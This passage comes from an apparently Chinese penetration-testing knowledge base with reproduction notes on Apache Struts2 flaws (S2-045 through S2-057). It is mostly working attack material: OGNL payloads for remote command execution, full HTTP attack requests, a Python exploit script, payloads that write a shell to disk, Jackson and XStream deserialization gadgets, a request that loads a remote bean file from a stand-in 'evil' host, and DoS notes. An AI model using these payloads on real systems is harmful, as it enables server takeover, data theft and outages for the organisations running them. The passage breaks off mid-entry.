timeout=10) if res.status_code == 200: print \"[+] Response: {}\".format(str(res.text)) print \"\\n[+] Exploit Finished!\" else: print \"\\n[!] Exploit Failed!\" if __name__ == \"__main__\": if len(sys.argv) != 4: print \"\"\"****S2-053 Exploit**** Usage: exploit.py Example: exploit.py \"http://127.0.0.1/\" \"name\" \"uname -a\" \"\"\" exit() url = sys.argv[1] param = sys.argv[2] command = sys.argv[3] #payload = \"%{([email protected]/* */@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@[email protected]/* */)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\"+command+\"').(#iswin=(@[email protected]/* */('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@[email protected]/* */().getOutputStream())).(@[email protected]/* */(#process.getInputStream(),#ros)).(#ros.flush())}\"\"\" # Can show the echo message payload = \"%{([email protected]/* */@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@[email protected]/* */)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\"+command+\"').(#iswin=(@[email protected]/* */('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@[email protected]/* */(#process.getInputStream()))}\" link = \"{}/?{}={}\".format(url, param, quote(payload)) print \"[*] Generated EXP: {}\".format(link) print \"\\n[*] Exploiting...\" exploit(link) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:34 "},"Web安全/Apache Struts/（CVE-2017-5638）S2-045/（CVE-2017-5638）S2-045.html":{"url":"Web安全/Apache Struts/（CVE-2017-5638）S2-045/（CVE-2017-5638）S2-045.html","title":"（CVE-2017-5638）S2-045","keywords":"","body":"（CVE-2017-5638）S2-045 一、漏洞简介 Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行。 实际上在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell（另外原本其实也有第三种选择cos）。其中的jakarta解析器是Struts 2框架的标准组成部分。默认情况下jakarta是启用的，所以该漏洞的严重性需要得到正视。 二、漏洞影响 Struts 2.3.5 -- Struts 2.3.31 Struts 2.5 -- Struts 2.5.10 三、复现过程 获取web相关信息exp 自己构造版本 优化前（并不适用2.5.10，但执行一次优化版本后就适用了）： %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#wmres=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#wmres.getWriter().print(\"S2-045 dir--***\")).(#wmreq=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath(\"/\"))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data 自己构造版本 优化后（遇到个xxxx 貌似不适用。我擦）： %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#_memberAccess))).(#wmres=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#wmres.getWriter().print(\"S2-045 dir--***\")).(#wmreq=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath(\"/\"))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data 网上别人的版本 %{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(#path.getBytes())).(#ros.flush())}.multipart/form-data 执行命令 网上公开修改版本： %{(#wm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#wm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#wm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data 上传文件getshell 自己构造版本（并不适用2.5.10）： %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#res=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#res.getWriter().print(\"OK\")).(#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#res.getWriter().flush()).(#res.getWriter().close()).(new java.io.BufferedWriter(new java.io.FileWriter(\"/1111/\")).append(new java.net.URLDecoder().decode(\"shell\",'UTF-8')).close())}.multipart/form-data 实用度高的版本无限制长度getshell版本（并不适用2.5.10） %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#bf=new java.io.BufferedWriter(new java.io.FileWriter(\"C:\\\\1.txt\"))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#bf)).(#bf.flush()).(#bf.close()).(#res=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#res.getWriter().print(\"OK\")).(#res.getWriter().flush()).(#res.getWriter().close())}.multipart/form-data 注意：无限制长度版本是因为Content-Type长度有限，它将post数据包里面所有的数据都写进指定路径文件里面。 poc #! /usr/bin/env python # encoding:utf-8 import urllib2 import sys from poster.encode import multipart_encode from poster.streaminghttp import register_openers def poc(): if len(sys.argv) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:32 "},"Web安全/Apache Struts/（CVE-2017-5638）s2-046/（CVE-2017-5638）s2-046.html":{"url":"Web安全/Apache Struts/（CVE-2017-5638）s2-046/（CVE-2017-5638）s2-046.html","title":"（CVE-2017-5638）s2-046","keywords":"","body":"（CVE-2017-5638）s2-046 一、漏洞简介 使用Jakarta插件，程序没有正确处理文件上传，通过构造HTTP请求头中的Content-type造成RCE 二、漏洞影响 2.3.5-2.3.31 2.5.0-2.5.10 三、复现过程 常见访问路径 /struts2-showcase/fileupload/doUpload.action> /doUpload.action> / POST / HTTP/1.1 Host: www.0-sec.org:8080 Content-Length: 549 Cache-Control: max-age=0 Origin: http://192.168.95.128:8080 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6WkqMfQ5bSxtxX4X User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://192.168.95.128:8080/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7 Connection: close ------WebKitFormBoundary6WkqMfQ5bSxtxX4X Content-Disposition: form-data; name=\"upload\"; filename=\"Content-Disposition: form-data; name=\"image1\"; filename=\"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#memberAccess?(#memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())}b\" Content-Type: text/plain ------WebKitFormBoundary6WkqMfQ5bSxtxX4X 图片.png 抓流量 抓到一个 出web目录的 后面自己加\\x00b %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())} 跟s2-048 payload是一样的 只有回显 好多都是通用的 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} 还可以找到doUpload.action 然后真提交文件 拦截包 把filename 改了 要加\\x00b s2-046 特别多的工具都可以用。。抓流量分析流量 分析出来几个功能payload 安恒工具 命令执行 payload POST / HTTP/1.1 Host:192.168.95.128:8080 Accept-Language: zh_CN User-Agent: Auto Spider 1.0 Accept-Encoding: gzip, deflate Connection: close Content-Length: 874 Content-Type: multipart/form-data; boundary=---------------------------7e116d19044c -----------------------------7e116d19044c Content-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}.b\" Content-Type: text/plain x -----------------------------7e116d19044c-- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:32 "},"Web安全/Apache Struts/（CVE-2017-7525）s2-055/（CVE-2017-7525）s2-055.html":{"url":"Web安全/Apache Struts/（CVE-2017-7525）s2-055/（CVE-2017-7525）s2-055.html","title":"（CVE-2017-7525）s2-055","keywords":"","body":"（CVE-2017-7525）s2-055 Jackson-databind 反序列化漏洞 一、漏洞简介 Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。 所以，本漏洞利用条件如下： 开启 JacksonPolymorphicDeserialization，即调用以下任意方法 objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETEobjectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); Target class 需要有无参 constructor Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口 二、漏洞影响 Struts 2.5 - Struts 2.5.14 三、复现过程 Jackson-databind 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 SetterlessProperty 调用 getter 方法，获取变量，然后设置变量值。当调用 getOutputProperties() 方法时，会初始化 transletBytecodes 包含字节码的类，导致命令执行，具体可参考 java-deserialization-jdk7u21-gadget-note 中关于 TemplatesImpl 的说明。 使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch /tmp/prove1.txt： POST /exploit HTTP/1.1 Host: www.0-sec.org:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 1298 { \"param\": [ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", { \"transletBytecodes\": [ \"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==\" ], \"transletName\": \"a.b\", \"outputProperties\": {} } ] } DL405K9JUHELS92AQ.png 这个POC只能运行在目标为JDK7u21以下的环境中，其他情况请更换Gadget。 CVE-2017-17485 CVE-2017-7525 黑名单修复 绕过，利用了 org.springframework.context.support.FileSystemXmlApplicationContext。 利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如http://www.0-sec.org/spel.xml，内容如下： touch /tmp/prove2.txt 然后，发送如下数据包，使Jackson加载bean，触发漏洞： POST /exploit HTTP/1.1 Host: www.0-sec.org:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 138 { \"param\": [ \"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://evil/spel.xml\" ] } 成功执行touch /tmp/prove2.txt： 7W3T1YXZ_Y78MAFQ.png 原理： 利用 FileSystemXmlApplicationContext 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 start() 方法实现命令执行 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:33 "},"Web安全/Apache Struts/（CVE-2017-9791）s2-048/（CVE-2017-9791）s2-048.html":{"url":"Web安全/Apache Struts/（CVE-2017-9791）s2-048/（CVE-2017-9791）s2-048.html","title":"（CVE-2017-9791）s2-048","keywords":"","body":"（CVE-2017-9791）s2-048 一、漏洞简介 当实用了Struts2 Struts1 插件时，可能导致不受信任的输入传入到ActionMessage类种导致命令执行 二、漏洞影响 2.3.x 三、复现过程 POC 1.png 2.png 回显 在正常页面里 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)} 3.pngburp里改 浏览器里填就500光有回显 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} 4.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:33 "},"Web安全/Apache Struts/（CVE-2017-9805）s2-052/（CVE-2017-9805）s2-052.html":{"url":"Web安全/Apache Struts/（CVE-2017-9805）s2-052/（CVE-2017-9805）s2-052.html","title":"（CVE-2017-9805）s2-052","keywords":"","body":"（CVE-2017-9805）s2-052 一、漏洞简介 Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表： 扩展名 Content-Type 解析方法 xml application/xml xstream json application/json jsonlib或jackson(可选) xhtml application/xhtml+xml 无 无 application/x-www-form-urlencoded 无 无 multipart/form-data 无 jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名： //或者 所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedgetType。 总得来说，用了Struts2-Rest-Plugin插件，这个插件是根据Content-Type或者扩展名来选择解析方法，xstream在默认情况下是可以引入任意对象的，所以他在处理xml的时候会发生RCE（xstream处理xml数据时，未对数据做任何过滤，在反序列化将xml数据转换成object时导致的RCE）。利用起来就是改Content-Type或扩展名 .xml application/xml 发恶意xml 二、漏洞影响 Struts 2.1.2 - Struts 2.3.33 Struts 2.5 - Struts 2.5.12 三、复现过程 POC 没回显 Response 500 但命令执行 POST /orders/3 HTTP/1.1 Host: 10.17.14.18:8081 Content-Length: 1655 Cache-Control: max-age=0 Origin: http://www.0-sec.org:8081 Upgrade-Insecure-Requests: 1 Content-Type: application/xml User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://10.17.14.18:8081/orders/3/edit Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7 Cookie: JSESSIONID=249144A9BEB141072470A76C2A61D663 Connection: close 0 false 0 /usr/bin/touch/tmp/vuln false java.lang.ProcessBuilder start foo foo false 0 0 false false 0 访问ip：port 直接到/orders 你可以直接change method 然后加上body 改Content-type 为xml Response status code 500 执行成功了（不要怀疑 我也怀疑 后来看了一下文件 是真的） 也可以编辑之后保存 会有一个POST /orders/5 或者其他数字 有body的 改掉body 改Content-type 为xml 也可以执行 编辑完之后还会有一个/orders.xhtml?statusCode=303 change method 删掉body 改Content-type 为xml 文件名就不用改了 不然404了 payload生成> 下载 \">https://github.com/ianxtianxt/marshalsec> mvn clean package -DskipTests> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO wget www.0-sec.org -O /tmp/1.html >1.txt> 注：针对XStream支持很多种Payload，找一个Struts2也支持的即可,需要找到Struts2库中适用的gedget（事实上我找了，都试了，只有ImageIO好使，文章的都是骗人了，哭了） Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:33 "},"Web安全/Apache Struts/（CVE-2018-11776）s2-057/（CVE-2018-11776）s2-057.html":{"url":"Web安全/Apache Struts/（CVE-2018-11776）s2-057/（CVE-2018-11776）s2-057.html","title":"（CVE-2018-11776）s2-057","keywords":"","body":"（CVE-2018-11776）s2-057 一、漏洞简介 当Struts2的配置满⾜以下条件时 alwaysSelectFullNamespace值为true action元素未设置namespace属性或使⽤了通配符 namespace将由⽤户从uri传⼊并作为OGNL表达式计算最终造成任意命令执⾏漏洞。 http://www.0-sec.org:8080/${1+1}/actionChain1.action ===> http://www.0-sec.org:8080/2/register2.action 二、漏洞影响 ⼩于等于 Struts 2.3.34 与 Struts 2.5.16 三、复现过程 POC 回显是url 2.3.34版本 RCE :white_check_mark: ${ (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}/actionChain1.action urlencode===> %24%7B%0A%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action 2.3.34版本RCE payload :white_check_mark: ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()))).(#w.close())}/actionChain1.action urlencode==> /%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action 2.5.16版本 弹计算器 可能环境没配对 :x: ${(#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),#jas502n.println(#d ),#jas502n.close())}/actionChain1.action 2.3.34版本弹计算器payload :x: 失败 2.5.16也失败 ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(\"woami\"))}/actionChain1.action 2.3.20版本弹计算器 没环境 ${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc.exe')}/index.action 2.3.20版本RCE payload 没环境 ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()))).(#w.close())} 工具 RCE payload :x: %25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23str%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream())).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.addHeader(%27cmd%27%2c%23str))%7d Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:35 "},"Web安全/Apache Struts/（CVE-2018-1327）S2-056/（CVE-2018-1327）S2-056.html":{"url":"Web安全/Apache Struts/（CVE-2018-1327）S2-056/（CVE-2018-1327）S2-056.html","title":"（CVE-2018-1327）S2-056","keywords":"","body":"（CVE-2018-1327）S2-056 一、漏洞简介 S2-056漏洞发生于Apache Struts2的REST插件，当使用XStream组件对XML格式的数据包进行反序列化操作，且未对数据内容进行有效验证时，攻击者可通过提交恶意XML数据对应用进行远程DoS攻击。 二、漏洞影响 Struts 2.1.1 - Struts 2.5.14.1 三、复现过程 复现需注意，S2-056消耗的是服务器内存资源，添加JAVA_OPTS=-Xms256m -Xmx512m修改Tomcat内存大小进行DoS。 \\bin\\catalina.bat \\bin\\catalina.sh rem ----- Execute The Requested Command --------------------------------------- set JAVA_OPTS=-Xms256m -Xmx512m echo Using CATALINA_BASE: \"%CATALINA_BASE%\" echo Using CATALINA_HOME: \"%CATALINA_HOME%\" echo Using CATALINA_TMPDIR: \"%CATALINA_TMPDIR%\" if \"\"%1\"\" == \"\"debug\"\" goto use_jdk echo Using JRE_HOME: \"%JRE_HOME%\" goto java_dir_displayed :use_jdk echo Using JAVA_HOME: \"%JAVA_HOME%\" :java_dir_displayed echo Using CLASSPATH: \"%CLASSPATH%\" 如Tomcat默认配置需使用更多肉鸡来进行攻击。CZUVXG~14CY4V~NS0TFU.png1、攻击成本可以说是比较高，拼资源。2、REST插件用的较少，因此漏洞威胁较小。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:35 "},"Web安全/Apache Struts/（CVE-2019-0230）S2-059/（CVE-2019-0230）S2-059.html":{"url":"Web安全/Apache Struts/（CVE-2019-0230）S2-059/（CVE-2019-0230）S2-059.html","title":"（CVE-2019-0230）S2-059","keywords":"","body":"CVE-2019-0230：Struts2 S2-059 远程代码执行复现 0x01 简介 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。 0x02 漏洞概述 漏洞编号CVE-2019-0230 Apache Struts框架, 